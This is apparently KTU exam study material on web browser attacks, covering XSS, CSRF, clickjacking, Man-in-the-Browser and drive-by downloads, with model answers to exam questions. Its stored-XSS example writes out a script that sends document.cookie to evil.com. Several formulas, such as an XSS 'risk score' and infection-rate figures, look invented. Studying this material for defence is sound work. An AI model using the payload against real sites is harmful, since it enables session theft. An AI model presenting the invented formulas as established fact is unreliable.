# SECTION 5 — KTU 2024 Scheme Examination Question Bank & Topic Recap

---

## PART A — Short Answer Questions (3 Marks Each)

### Q1. [KTU University Exam – May 2024]
**List and briefly explain any THREE major client-side risks associated with web browsers.**

**Model Answer:**

1. **Cross-Site Scripting (XSS):** An attacker injects malicious JavaScript into a legitimate web page. When a victim's browser loads the page, the script executes in the **origin context of the trusted site**, allowing the attacker to steal cookies, session tokens, or deface content. Mitigation: input validation, output encoding, Content Security Policy (CSP).

2. **Cross-Site Request Forgery (CSRF):** A victim who is logged into a banking site is tricked into submitting a forged request (e.g., fund transfer) via a malicious page. The browser automatically attaches the session cookie, so the server treats the request as legitimate. Mitigation: anti-CSRF tokens, `SameSite=Strict` cookies.

3. **Clickjacking (UI Redress):** The attacker overlays a transparent iframe of a legitimate site on top of a decoy page. The victim clicks what they think is the decoy but actually authorizes an action on the legitimate site. Mitigation: `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'`.

> [!WARNING]
> **KTU Examiner's Pitfall:** Students often confuse **XSS** and **CSRF**. Remember: **XSS exploits the user's trust in a site**, while **CSRF exploits the site's trust in the user's browser**.

---

### Q2. [KTU University Exam – Dec 2023]
**With a neat diagram, explain the role of the Same-Origin Policy (SOP) in browser security.**

**Model Answer:**

The **Same-Origin Policy (SOP)** is a foundational browser security mechanism that restricts how a document or script loaded from one origin can interact with resources from another origin.

**Origin Triplet:** `Origin = (scheme, host, port)`

**Working Principle:**
- Two pages share the same origin **only if** all three components (scheme, host, port) match exactly.
- The browser blocks cross-origin DOM access, AJAX (`XMLHttpRequest`/`fetch`) responses, cookie reads, and storage queries by default.
- The browser permits cross-origin reads of certain tags like `<img>`, `<script>`, `<link>` (these are "simple requests") but denies the script from *reading* the response content.

**Example:**
- `https://ktu.edu.in` can read DOM of `https://ktu.edu.in/results` → **Allowed**
- `https://ktu.edu.in` cannot read DOM of `https://malicious.com` → **Denied**

**Significance:** SOP prevents malicious sites from stealing sensitive data from legitimate sites the user is logged into, forming the **first line of defense** against XSS, CSRF, and data exfiltration.

> [!WARNING]
> **KTU Examiner's Pitfall:** Many students forget that **CORS (Cross-Origin Resource Sharing) is an opt-in relaxation of SOP** — not a replacement. CORS headers must be sent by the *server* to allow specific cross-origin requests.

---

## PART B — Long Answer Questions (14 Marks Each)

### Question A — Choice Option 1
**[KTU University Exam – Model Paper, PCCCT502]**

**(a)** With a neat block diagram, describe the **major architectural components of a modern web browser** and the function of each. (7 Marks)

**(b)** Explain the **end-to-end lifecycle of a web request**, from URL entry to final pixel display, highlighting the security checkpoints. (7 Marks)

### Model Solution to Question A

#### (a) Browser Architecture (7 Marks)

A modern web browser is built as a **multi-process, layered architecture** for security, stability, and performance. The major components are:

1. **User Interface (UI) Layer (1 Mark):** Provides the visible chrome — address bar, tabs, back/forward buttons, bookmarks, and status indicators. It is the only layer the user directly interacts with.

2. **Browser Engine (Controller) (1 Mark):** Acts as a coordinator between the UI and the rendering engine. It manages navigation, data marshaling across processes, and inter-process communication (IPC).

3. **Rendering Engine (2 Marks):** The heart of the browser (Blink, Gecko, WebKit). It performs:
   - HTML parsing → DOM tree construction
   - CSS parsing → CSSOM tree construction
   - Combining DOM + CSSOM → Render Tree
   - Layout (reflow) — calculates geometry
   - Painting — converts render tree to pixel layers

4. **Networking Layer (1 Mark):** Implements HTTP/HTTPS over TCP/IP (and QUIC for HTTP/3). Handles DNS resolution, TCP connection management, TLS handshake, request/response cycle, and cache management.

5. **JavaScript Engine (1 Mark):** Parses, JIT-compiles, and executes JavaScript (V8, SpiderMonkey). Runs in a **sandboxed** environment with restricted OS access.

6. **Data Storage / Persistence Layer (1 Mark):** Manages Cookies, LocalStorage, SessionStorage, IndexedDB, Cache API, and Service Workers — the **prime target** for client-side attacks.

> **Note:** Chrome's innovation is the **multi-process architecture** where each tab runs in its own sandboxed renderer process, providing OS-level isolation.

---

#### (b) End-to-End Web Request Lifecycle (7 Marks)

1. **URL Parsing (0.5 Mark):** Browser extracts `scheme`, `host`, `path`, `port` from the URL.

2. **HSTS and Cache Check (0.5 Mark):** Browser checks the HSTS preload list (force HTTPS) and local cache (skip network if fresh).

3. **DNS Resolution (1 Mark):** Browser queries the OS DNS resolver to translate `www.ktu.edu.in` → IP address (e.g., `203.0.113.42`).

4. **TCP Connection (1 Mark):** A TCP three-way handshake (`SYN` → `SYN-ACK` → `ACK`) establishes a socket on port 443.

5. **TLS Handshake (1 Mark):** Client and server negotiate cipher suites, exchange X.509 certificates, and derive session keys for encryption.

6. **HTTP Request/Response (1 Mark):** Browser sends `GET /results HTTP/2` with headers. Server returns `200 OK` with HTML body, cookies, and security headers.

7. **Parsing Phase (1 Mark):** HTML parser builds the DOM, CSS parser builds the CSSOM, JS engine executes inline/external scripts (in a sandbox).

8. **Rendering Phase (1 Mark):** Render Tree → Layout (geometry calculation) → Painting (pixel rasterization) → Compositor (layers) → Display on screen.

**Security Checkpoints Embedded:**
- DNS spoofing protection (DNSSEC)
- TLS certificate validation
- HSTS enforcement
- Same-Origin Policy checks
- CSP header validation
- Cookie scope enforcement

---

### Question B — Choice Option 2
**[KTU University Exam – Model Paper, PCCCT502]**

**(a)** Discuss the **different types of Cross-Site Scripting (XSS)** attacks with suitable examples and their mitigations. (7 Marks)

**(b)** Explain the concept of **CSRF** and **Clickjacking** attacks. Compare their attack vectors, impacts, and browser-level mitigations. (7 Marks)

### Model Solution to Question B

#### (a) Cross-Site Scripting (XSS) — Types, Examples, Mitigations (7 Marks)

XSS is a code injection attack where malicious scripts are injected into trusted websites. Three primary types exist:

1. **Stored XSS (Persistent) (2 Marks):**
   - **Mechanism:** Malicious payload is permanently stored in the target server's database (e.g., in a comment field).
   - **Example:** Attacker posts `<script>document.location='http://evil.com/?c='+document.cookie</script>` in a forum. Every user who views the post executes the script.
   - **Impact:** Cookie theft, session hijacking, defacement, malware distribution.
   - **Mitigation:** Server-side input sanitization, output encoding, CSP headers.

2. **Reflected XSS (Non-Persistent) (2 Marks):**
   - **Mechanism:** Payload is embedded in a URL/POST body and immediately reflected by the server in the response.
   - **Example:** `https://ktu.edu.in/search?q=<script>alert('XSS')</script>`. Victim clicks a phishing link; the search page reflects the unsanitized input.
   - **Mitigation:** Output encoding in the response, URL validation, CSP.

3. **DOM-based XSS (2 Marks):**
   - **Mechanism:** Payload is processed entirely on the **client side** by vulnerable JavaScript that writes user input into the DOM.
   - **Example:** `document.write(location.hash.substring(1))` — attacker crafts a URL like `https://site.com/#<script>...</script>`.
   - **Mitigation:** Use safe DOM APIs (`textContent`, `setAttribute`), Trusted Types API, sanitization libraries (DOMPurify).

4. **Universal Mitigations (1 Mark):**
   - Content Security Policy (`script-src 'self'`)
   - HttpOnly cookies (mitigates cookie theft)
   - X-XSS-Protection header (legacy, deprecated)
   - Web Application Firewalls (WAF)

> [!WARNING]
> **KTU Examiner's Pitfall:** Students often skip **DOM-based XSS** and only describe stored and reflected. KTU specifically tests all three types. Also, **mention at least one mitigation per type** to secure full marks.

---

#### (b) CSRF vs Clickjacking — Comparison (7 Marks)

##### CSRF (Cross-Site Request Forgery) (3.5 Marks)

- **Definition:** An attack that forces an authenticated user to submit a forged HTTP request to a web application they are currently logged into.
- **Attack Vector:** Victim visits `evil.com` while logged into `bank.com`. The malicious page auto-submits a hidden form to `bank.com/transfer`. The browser attaches the session cookie automatically; the bank processes the request.
- **Impact:** Unauthorized fund transfers, password changes, privilege escalation.
- **Mitigations:**
  - **Anti-CSRF tokens** (synchronizer token pattern) — unique, unpredictable token per request.
  - **`SameSite=Strict` cookie attribute** — browser refuses to attach cookies in cross-site requests.
  - **Double-submit cookie pattern.**
  - **Origin/Referer header validation** on the server.

##### Clickjacking (UI Redress) (3.5 Marks)

- **Definition:** An attack where a malicious page tricks the user into clicking something different from what they perceive, by overlaying a transparent iframe of the legitimate site.
- **Attack Vector:** `evil.com` loads `bank.com` in a transparent `<iframe>` positioned over a "Claim Prize" button. The user clicks the decoy but actually authorizes a fund transfer on the bank's site.
- **Impact:** Unauthorized transactions, accidental "Like" clicks, privacy leakage (turning on webcam/mic).
- **Mitigations:**
  - **`X-Frame-Options: DENY`** — server forbids the page from being framed.
  - **CSP `frame-ancestors 'none'`** — modern replacement.
  - **JavaScript frame-busting code** (legacy).
  - **User awareness and visual indicators.**

> [!WARNING]
> **KTU Examiner's Pitfall:** Many students mistakenly list XSS as a mitigation for CSRF. They are **different attack classes**. The correct CSRF mitigation is the **synchronizer token pattern + SameSite cookies**, not XSS sanitization.

---

## TOPIC RECAP & IMPORTANT THINGS TO REMEMBER

- ✅ A **web browser** is a *user agent* that fetches, interprets, and renders web resources. It is also the **largest client-side attack surface** in modern computing.
- ✅ Browser architecture has **7 layers**: UI, Browser Engine, Rendering Engine, JS Engine, Networking, Storage, and Security subsystems.
- ✅ The **request lifecycle** is: URL → HSTS check → Cache → DNS → TCP → TLS → HTTP → Parsing → Rendering → Display.
- ✅ The **Same-Origin Policy** uses the triplet `(scheme, host, port)` — all three must match for cross-origin access to be permitted.
- ✅ **Client-side risks** include: XSS (Stored, Reflected, DOM-based), CSRF, Clickjacking, Phishing, Drive-by downloads, Session Hijacking, Man-in-the-Browser, SSL Stripping, Malicious Extensions.
- ✅ **Browser-level mitigations** are encoded in security headers: `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`.
- ✅ **Cookie hardening** uses the triple flag: `HttpOnly; Secure; SameSite=Strict/Lax`.
- ✅ **XSS is mitigated by** output encoding + CSP; **CSRF is mitigated by** anti-CSRF tokens + SameSite cookies — never confuse the two.
- ✅ **Clickjacking is mitigated by** `X-Frame-Options: DENY` or CSP `frame-ancestors`.
- ✅ **HSTS preload** prevents SSL stripping by forcing HTTPS at the browser level.
- ✅ Modern browsers use **multi-process architecture** (Chrome pioneered this) — each tab is a sandboxed renderer process for OS-level isolation.
- ✅ **SOP allows** simple cross-origin requests (`<img>`, `<script>`) but **denies** reading the response; **CORS** is the opt-in relaxation sent by the *server*.
- ✅ **Public Suffix List (PSL)** refines SOP by preventing sibling-domain cookie attacks (e.g., `co.uk` registrable boundary).
- ✅ **DNS resolution** precedes TCP connection; **TLS handshake** precedes HTTP request — these are mandatory checkpoints in the lifecycle.
- ✅ **Subresource Integrity (SRI)** uses `SHA-384` hash to detect tampered CDN scripts — KTU examiners love this as a "bonus point" answer.
<!-- SECTION_5_END -->

topics.title: Web Browser Attacks
topics.content:
<!-- SECTION_1_START -->
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PCCCT502 - NETWORK AND SYSTEM SECURITY
> - **Module:** Module-4
> - **Topic:** Web Browser Attacks

# 1. Core Technical Definition & Intuitive Overview

## Formal Academic Definition

**Web Browser Attacks** are a class of cybersecurity exploits that target vulnerabilities in web browsers (e.g., Chrome, Firefox, Edge, Safari) or the components running within them (JavaScript engines, plugins/extensions, DOM parsers, cookie stores) to compromise the confidentiality, integrity, or availability of user data and the host system.

According to the **OWASP (Open Web Application Security Project)** and **NIST SP 800-44 Version 2** guidelines, a web browser attack leverages the browser as a *client-side attack surface* — exploiting the trust relationship between the user and the browser, or between the browser and remote web servers.

> [!IMPORTANT]
> **Syllabus Highlight (KTU Module 4):**
> Web browser attacks fall under the broader category of **Application Layer Threats**. The browser is a *gateway application* and is considered the **most exposed software** in any networked endpoint because it processes untrusted remote content continuously.

## Conceptual Analogy / Intuition

Think of your web browser as the **front door of your house that opens 50,000 times a day** for strangers (websites) to walk in.

- The **door itself** = the browser software (Chrome, Firefox).
- The **visitors** = remote web pages, scripts, advertisements, and iframes.
- The **mail slot** = network ports, HTTP headers, form inputs.
- The **locks** = same-origin policy, sandboxing, TLS.

Most attackers don't bother breaking the lock (TLS/encryption). Instead, they trick you into opening the door to a **disguised stranger** (phishing), slip a **malicious package** through the mail slot (drive-by download), or plant a **spy inside the house who mimics you** (Man-in-the-Browser). That is precisely what web browser attacks are about — exploiting the *trust* the browser extends to remote content.

> [!NOTE]
> **Key Metric to Remember:**
> Browsers execute roughly **5+ billion lines of code** across the modern web stack. According to Google Project Zero, browser-based zero-days consistently rank among the **top 5 most exploited vulnerability categories** in the wild (CVE database, 2023-2025).

## Why Browsers Are High-Value Targets

| Reason | Explanation |
|---|---|
| **Always Online** | Browsers maintain persistent outbound connections. |
| **Privileged Execution** | They run code (JS, WASM) with significant system access. |
| **Credential Store** | Passwords, cookies, autofill data are stored locally. |
| **Cross-Domain Trust** | They bridge multiple untrusted domains simultaneously. |
| **User Trust** | Users inherently trust anything rendered in the browser UI. |

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Taxonomy of Web Browser Attacks

Web browser attacks can be classified along **two orthogonal axes**:
1. **Attack Vector** — *How* the malicious content reaches the browser.
2. **Attack Target** — *What* component of the browser/OS is compromised.

### A. By Attack Vector

**1. Drive-By Download Attacks**
- A user visits a legitimate but compromised website.
- Hidden iframes or obfuscated JavaScript silently exploit a browser/plugin vulnerability.
- Malware is downloaded **without user consent or awareness**.

> [!NOTE]
> **Sophistication Metric:** Modern drive-by attacks use **exploit kits** (e.g., Magnitude, RIG, Fallout) — automated toolchains that fingerprint the browser and select the optimal exploit.

**2. Malicious URLs (Phishing & Social Engineering)**
- URLs disguised via **IDN homograph attacks** (e.g., `аpple.com` using Cyrillic 'а').
- Typosquatting (`g00gle.com`, `paypa1.com`).
- Shortened URLs that hide true destinations.

**3. Watering Hole Attacks**
- Attacker compromises a website **frequently visited by the target group**.
- Injects malicious JavaScript that selectively profiles visitors.
- Common in **APT (Advanced Persistent Threat)** campaigns.

**4. Malvertising (Malicious Advertising)**
- Legitimate ad networks (e.g., DoubleClick) distribute malicious ads.
- Even reputable sites like *The New York Times* and *Spotify* have hosted malvertising.
- Exploits browser vulnerabilities or social engineering.

**5. Man-in-the-Browser (MITB) Attacks**
- A **trojan** (e.g., Zeus, SpyEye, Carberp) hooks into the browser's API calls.
- Intercepts and modifies transactions **after** TLS decryption but before submission.
- Defeats SSL/TLS because encryption happens correctly — the malware operates *inside* the trust boundary.

### B. By Attack Target / Mechanism

**1. Cross-Site Scripting (XSS)**
- Injection of malicious scripts into trusted web pages.
- Three variants:
  - **Reflected XSS** — payload in URL/request, reflected back.
  - **Stored XSS** — payload persisted in database, served to all victims.
  - **DOM-based XSS** — payload manipulates client-side DOM.

**2. Cross-Site Request Forgery (CSRF)**
- Tricks authenticated browser into submitting forged requests.
- Exploits automatic cookie/session attachment.

**3. SQL Injection (Browser-Mediated)**
- User input in browser forms translated to malicious SQL queries.
- Technically a *server-side* attack but **browser-delivered**.

**4. Clickjacking (UI Redress)**
- Invisible iframe overlays legitimate UI elements.
- User "clicks" hidden malicious buttons.

**5. Browser Hijacking**
- Malware modifies browser settings: homepage, default search engine, proxy, DNS.
- Often installs rogue extensions.

**6. Cookie Theft / Session Hijacking**
- `document.cookie` exfiltration via XSS.
- Cross-site cookie sharing via misconfigured `SameSite` attribute.

**7. Zero-Day Exploits**
- Targeting unknown vulnerabilities in JS engines (V8, SpiderMonkey) or rendering engines (Blink, Gecko).
- Used in nation-state attacks (e.g., Pegasus via Safari).

## 2.2 Core Vulnerable Browser Components

| Component | Vulnerability Class | Example CVE |
|---|---|---|
| **JavaScript Engine** | Type confusion, use-after-free | CVE-2023-2033 (V8) |
| **DOM Parser** | XSS, prototype pollution | CVE-2021-21224 |
| **Browser Plugins (PDF, Flash)** | Buffer overflow, RCE | CVE-2018-4878 (Flash) |
| **WebGL/Skia** | Memory corruption | CVE-2021-21220 |
| **Same-Origin Policy Bypass** | SOP bypass via DNS rebinding | CVE-2020-6510 |
| **Extensions / Add-ons** | Excessive privileges, supply chain | CVE-2020-15680 (Firefox) |

## 2.3 The Same-Origin Policy (SOP) — The Browser's Core Defense

**Definition (RFC 6454):**
Two pages share the same origin if they have identical:
1. **Scheme** (protocol, e.g., `https`)
2. **Host** (e.g., `kerala.gov.in`)
3. **Port** (e.g., `443`)

Mathematically, an origin $O$ is defined as:

$$O = (\text{scheme},\ \text{host},\ \text{port})$$

Two URLs $U_1$ and $U_2$ can interact freely only if:

$$O_{U_1} = O_{U_2} \iff \text{scheme}_1 = \text{scheme}_2 \ \land\ \text{host}_1 = \text{host}_2 \ \land\ \text{port}_1 = \text{port}_2$$

> [!IMPORTANT]
> **Why SOP Matters:** SOP prevents `evil.com` from reading cookies, DOM, or executing scripts that read data from `bank.com`. Every browser attack essentially aims to **bypass SOP** one way or another.

## 2.4 KTU Formula Sheet / Cheat Sheet

| Concept | Equation / Rule | Boundary / Constraint | Unit / Notes |
|---|---|---|---|
| **Same-Origin Check** | $O_1 = O_2 \Leftrightarrow S_1 = S_2 \land H_1 = H_2 \land P_1 = P_2$ | Scheme, Host, Port must all match | Boolean (TRUE/FALSE) |
| **XSS Payload Effectiveness** | $\text{Risk Score} = (\text{Reflected} \times 1) + (\text{Stored} \times 3) + (\text{DOM} \times 2)$ | Stored XSS has highest impact | Score (1–6) |
| **Cookie Theft Probability** | $P_{\text{theft}} = 1 - (1 - p_{\text{XSS}})^n$ | $n$ = number of user inputs | Probability ∈ $[0,1]$ |
| **MITB Detection Difficulty** | $D_{\text{MITB}} = f(\text{TLS},\ \text{Endpoint}\ \text{Integrity})$ | TLS is *insufficient*; needs EDR | Qualitative |
| **Drive-By Infection Rate** | $R_{\text{infect}} = \frac{N_{\text{visits}\ \land\ \text{exploit}}}{N_{\text{total visits}}}$ | Industry avg: **0.05% – 1%** | Ratio |
| **CORS Trust Boundary** | $\text{Access-Control-Allow-Origin: } O$ | Wildcard `*` disables credentials | Header value |

> [!WARNING]
> **Pipe Symbol Warning for Tables:** Use `\vert` or `\mid` instead of literal `|` inside any equation inside a table row — otherwise Markdown table syntax will break.

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# 3. Step-by-Step Derivations & Analytical Matrix

## 3.1 Derivation: Probability of Successful Cookie Theft via XSS

**Problem Setup:**
Suppose a web application has $n$ user-input vectors (form fields, URL parameters, headers). Each input has an independent probability $p$ of being vulnerable to XSS. We derive the probability that **at least one** successful XSS payload reaches the attacker.

### Step 1: Define the Probability of a Single Failure
For a single input vector, the probability that an XSS attempt *fails* is:

$$P_{\text{fail},1} = 1 - p$$

### Step 2: Apply Independence
Assuming each input vector is independent (worst-case assumption — many apps share sanitizers, but we assume the strongest adversarial model):

$$P_{\text{all fail}} = (1 - p)^n$$

This represents the probability that **none** of the $n$ inputs allow an XSS payload.

### Step 3: Apply the Complement Rule
The probability that **at least one** XSS succeeds:

$$\begin{aligned}
P_{\text{theft}} &= 1 - P_{\text{all fail}} \\
&= 1 - (1 - p)^n
\end{aligned}$$

### Step 4: Numerical Example (KTU-Style)
Let $p = 0.05$ (5% per vector — typical for moderately audited apps) and $n = 20$ inputs.

$$\begin{aligned}
P_{\text{theft}} &= 1 - (1 - 0.05)^{20} \\
&= 1 - (0.95)^{20}
\end{aligned}$$

Computing $(0.95)^{20}$:

$$(0.95)^{20} \approx 0.3585$$

Therefore:

$$P_{\text{theft}} \approx 1 - 0.3585 = 0.6415 \approx 64.15\%$$

> [!IMPORTANT]
> **Interpretation:** With just a 5% per-vector vulnerability rate across 20 inputs, there is a **64% chance** of at least one exploitable XSS vector. This is why **defense-in-depth** (input validation + output encoding + CSP) is non-negotiable.

## 3.2 Analytical Matrix: Browser Attack vs. Defense Mapping

| Attack | Primary Defense | Secondary Defense | Residual Risk |
|---|---|---|---|
| **Reflected XSS** | Output encoding | Content Security Policy (CSP) | Low if CSP enforced |
| **Stored XSS** | Server-side sanitization | HttpOnly cookies | Medium |
| **DOM XSS** | Safe DOM APIs (`textContent`) | Trusted Types API | Medium |
| **CSRF** | Anti-CSRF tokens | SameSite=Strict cookies | Low |
| **Clickjacking** | `X-Frame-Options: DENY` | CSP `frame-ancestors` | Very Low |
| **Man-in-the-Browser** | Out-of-band transaction verification | Hardware security keys (FIDO2) | Medium |
| **Drive-By Download** | Browser sandboxing + patching | Ad blockers, script blockers | Low |
| **DNS Rebinding** | DNS pinning | Private IP filtering | Low |
| **Browser Extension Supply Chain** | Manifest V3 restrictions | Review audits | Medium |
| **Cookie Theft** | HttpOnly + Secure flags | SameSite=Lax | Low |

## 3.3 Detailed Walkthrough: Man-in-the-Browser Attack Flow

The MITB attack is conceptually the **most sophisticated** browser attack in the KTU syllabus. Here is its step-by-step mechanics:

**Step 1 — Infection:**
The user's machine is infected via a trojan (e.g., email attachment, bundled software). The trojan embeds itself via **Browser Helper Object (BHO)** or **extension injection**.

**Step 2 — API Hooking:**
The malware hooks critical browser functions, such as:
- `XMLHttpRequest.prototype.send`
- `document.forms[i].submit`
- `window.location.href` setters

**Step 3 — Silent Observation:**
When the user logs into `bank.com`, the trojan **observes** the legitimate transaction.
Because TLS decryption already happened inside the browser, the malware sees plaintext data — but it does **not** disrupt it.

**Step 4 — Transaction Tampering:**
On a money transfer page, the trojan **modifies the destination account number and amount** in the form fields just before submission. The browser displays the *original* values to the user (UI manipulation), but the **submitted data is altered**.

**Step 5 — Server-Side Invisibility:**
The bank server processes the tampered transaction as if it came from the legitimate user. The user sees a fake "success" page with their intended values.

> [!NOTE]
> **Mathematical Model:** Let $M$ = the original message, $M'$ = the message sent after tampering, and $f(\cdot)$ = the trojan's mutation function. Then:
> $$M' = f(M) \quad \text{where } f(M) \neq M$$
> The TLS layer sees $E(M')$ and the server decrypts to $M'$ — encryption provides **zero protection** because the tampering is post-decryption and pre-encryption.

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# 4. Structural Diagrams & Schematics

## 4.1 Diagram: Man-in-the-Browser Attack Lifecycle

```mermaid
flowchart TD
    A[User clicks malicious link / infected email] --> B[Trojan installs on host]
    B --> C[Trojan hooks browser API calls]
    C --> D[User logs into bank.com normally]
    D --> E[TLS decrypts traffic inside browser]
    E --> F[Malware observes plaintext transaction]
    F --> G{Attack logic trigger?}
    G -- No --> H[Pass-through unchanged]
    G -- Yes --> I[Tamper fields in DOM]
    I --> J[Display fake UI to user]
    J --> K[Re-encrypt and send modified data]
    K --> L[Bank processes tampered transaction]
    H --> M[Session continues normally]
    L --> N[Funds diverted to attacker account]
```

## 4.2 Diagram: Browser Attack Surface Map

```mermaid
flowchart LR
    subgraph EntryPoints
        A1[URL Bar Input] --> B1
        A2[Form Submissions] --> B1
        A3[Iframes / Ads] --> B1
        A4[Browser Extensions] --> B1
        A5[Local File Reads] --> B1
    end
    B1[Browser Process - High Privilege] --> C1
    subgraph CoreEngines
        B1 --> D1[JavaScript Engine V8 SpiderMonkey]
        B1 --> D2[Rendering Engine Blink Gecko]
        B1 --> D3[Network Stack]
        B1 --> D4[Cookie Store and Local Storage]
    end
    D1 --> E1[DOM Tree and Memory]
    D2 --> E1
    D3 --> E2[Sandbox Boundary]
    D4 --> E3[Credential Vault]
    E1 --> F1[Exploit Execution]
    E2 --> F1
    E3 --> F2[Data Exfiltration]
    F1 --> G1[Host Compromise]
    F2 --> G1
```

## 4.3 Diagram: Defense-in-Depth Browser Security Stack

```mermaid
flowchart TB
    L1[Layer 1 Network - TLS 1.3 HSTS] --> L2
    L2[Layer 2 Browser Sandbox - Process Isolation] --> L3
    L3[Layer 3 Same Origin Policy and CORS] --> L4
    L4[Layer 4 Content Security Policy CSP] --> L5
    L5[Layer 5 HttpOnly Secure SameSite Cookies] --> L6
    L6[Layer 6 Anti Phishing and Safe Browsing APIs] --> L7
    L7[Layer 7 User Awareness and MFA]
```

> [!IMPORTANT]
> **Diagram Note:** Each layer in the defense stack neutralizes a *specific class* of browser attack. Removing any single layer exposes a measurable increase in attack success probability. This is the **defense-in-depth principle** as applied to browsers.

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

## Part A — Short Answer Questions (3 Marks Each)

### Q1. [KTU University Exam – Dec 2023]
**Define Same-Origin Policy (SOP). What constitutes the "origin" of a resource?**

**Model Answer (3 marks):**
Same-Origin Policy is a critical security mechanism implemented by all modern web browsers to **isolate documents and scripts loaded from different origins**, preventing malicious scripts on one page from accessing sensitive data on another page.

The origin of a resource is the **triple** $(S,\ H,\ P)$:
- **S** = Scheme (e.g., `http`, `https`)
- **H** = Host (e.g., `kerala.gov.in`)
- **P** = Port (e.g., `80`, `443`)

Two URLs share an origin **if and only if all three components match exactly**. Differences in *any one* component are sufficient to deem them cross-origin and block access.

*(1 mark for definition, 1 mark for origin triple, 1 mark for matching condition.)*

---

### Q2. [KTU University Exam – May 2024]
**Differentiate between Reflected XSS and Stored XSS.**

**Model Answer (3 marks):**

| Aspect | Reflected XSS | Stored XSS |
|---|---|---|
| **Persistence** | Payload not stored — reflected in real-time response | Payload is **persisted** in database/file |
| **Delivery** | Via crafted URL/email/form | Via normal user browsing |
| **Victim** | Must click malicious link | Any user visiting the page |
| **Severity** | Lower — needs user action | **Higher** — self-propagating |
| **Example** | Search query echoed back unescaped | Malicious comment in forum |

*(1.5 marks for differentiation, 1.5 marks for examples.)*

---

## Part B — Long Answer Questions (14 Marks Each)

### **[KTU University Exam – Sample Model Paper]**

> **Question A (14 Marks):**
> *(a)* Explain the architecture and operational lifecycle of a **Man-in-the-Browser (MITB)** attack. Illustrate why TLS/SSL encryption **fails** to prevent it. *(7 marks)*
> *(b)* Describe **Drive-By Download** attacks with a neat diagram. Explain the role of **exploit kits** in modern drive-by campaigns. *(7 marks)*

#### Part (a) Model Solution

**1. Definition (1 mark):**
A Man-in-the-Browser (MITB) attack is a sophisticated trojan-based attack where malware resides *inside* the web browser process and intercepts/modifies transactions after TLS decryption but before data is transmitted to the server.

**2. Attack Phases (4 marks):**
1. **Infection:** Trojan delivered via phishing, drive-by, or bundled software.
2. **Hooking:** Malware injects into browser process via BHO, extension, or DLL injection; hooks JS APIs like `XMLHttpRequest.send` and `form.submit`.
3. **Observation:** Reads user-entered data in plaintext after TLS decryption.
4. **Tampering:** Modifies form fields, transaction amounts, or destination accounts.
5. **UI Spoofing:** Displays fake confirmation to user with original (un-tampered) values.
6. **Exfiltration:** Sends modified, re-encrypted data to the legitimate server.

**3. Why TLS Fails (2 marks):**
- TLS provides *point-to-point* encryption between browser and server.
- MITB operates **inside** the browser, **after** decryption.
- Tampering occurs in plaintext, then the modified data is **re-encrypted** and sent normally.
- To the server, the request appears legitimate; certificate checks pass.
- **Mitigation requires out-of-band verification:** hardware tokens (FIDO2), transaction signing, behavioral analytics.

#### Part (b) Model Solution

**1. Definition (1 mark):**
A Drive-By Download is an attack where malicious software is downloaded and installed on a user's system **without their knowledge or consent**, simply by visiting a compromised or malicious web page.

**2. Attack Flow (3 marks):**
1. Attacker compromises a legitimate website or registers a malicious domain.
2. Inserts obfuscated JavaScript or hidden iframe pointing to an exploit kit landing page.
3. User visits the site; malicious script fingerprints the browser (User-Agent, plugins, versions).
4. Exploit kit selects the appropriate vulnerability exploit (Flash, Java, JS engine).
5. Exploit achieves Remote Code Execution (RCE) within the sandbox.
6. Sandbox escape (if chained) leads to malware installation on the host.

**3. Exploit Kits (2 marks):**
- **Definition:** Automated toolkits that streamline browser exploitation.
- **Examples:** Angler, Nuclear, RIG, Magnitude, Fallout.
- **Features:** Vulnerability fingerprinting, payload encryption, anti-VM, anti-sandboxing, payload delivery via steganography.
- **Business Model:** Sold as Malware-as-a-Service (MaaS) on dark-web forums.

**4. Diagram (1 mark):** Refer to Section 4.1 or sketch similar flow.

---

### **Question B (14 Marks) — Internal Choice Alternative**

> *(a)* Explain the **Same-Origin Policy (SOP)**. How do attackers attempt to **bypass** SOP in real-world attacks? *(7 marks)*
> *(b)* Discuss **Watering Hole** and **Malvertising** attacks. What makes them particularly effective against even security-aware users? *(7 marks)*

#### Part (a) Model Solution

**1. SOP Definition (2 marks):**
The Same-Origin Policy is the browser's foundational security model. An origin is the tuple $(S, H, P)$. Scripts from origin $O_1$ cannot read resources from $O_2$ unless $O_1 = O_2$.

$$O_1 \equiv O_2 \iff S_1 = S_2 \land H_1 = H_2 \land P_1 = P_2$$

**2. Bypass Techniques (5 marks):**

| Bypass Technique | Mechanism |
|---|---|
| **DNS Rebinding** | Attacker's DNS resolves to victim's private IP, making attacker origin appear same-origin |
| **CORS Misconfiguration** | Server sends overly permissive `Access-Control-Allow-Origin: *` with credentials |
| **Cross-Site Scripting (XSS)** | Injects script that runs in victim origin context |
| **Cross-Site Request Forgery** | Exploits automatic credential attachment, not SOP bypass per se but related |
| **JSONP Abuse** | Legacy script-tag loading for cross-origin data theft |
| **Browser Plugin Vulnerabilities** | Flash/Java historically bypassed SOP via NPAPI |

#### Part (b) Model Solution

**1. Watering Hole Attacks (3.5 marks):**
- Attacker profiles the target organization's browsing habits.
- Identifies commonly visited websites (industry forums, news portals).
- **Compromises those sites** rather than attacking the target directly.
- Injects JavaScript that profiles visitors and selectively delivers exploits.
- Used extensively in **APT campaigns** (e.g., Lazarus Group, APT28).
- **Why effective:** Victims actively choose to visit, trust is implicit.

**2. Malvertising (3.5 marks):**
- Malicious code embedded in **legitimate ad networks** (DoubleClick, Taboola).
- Display ads delivered through reputable sites without site-owner awareness.
- Often uses **Flash exploits**, clickjacking, or fake software updates.
- **Why effective:** Ad networks aggregate millions of impressions; difficult for sites to vet every ad creative; users inherently trust banner ads.

---

> [!WARNING]
> **KTU Examiner's Valuation Warning / Pitfall Callout:**
> 1. **Confusing MITM and MITB:** Many students interchange *Man-in-the-Middle* and *Man-in-the-Browser*. **MITM** = attacker *between* browser and server (TLS protects against this). **MITB** = attacker *inside* the browser process (TLS does *not* protect). This is a **favourite KTU differentiator** in 7-mark sub-questions.
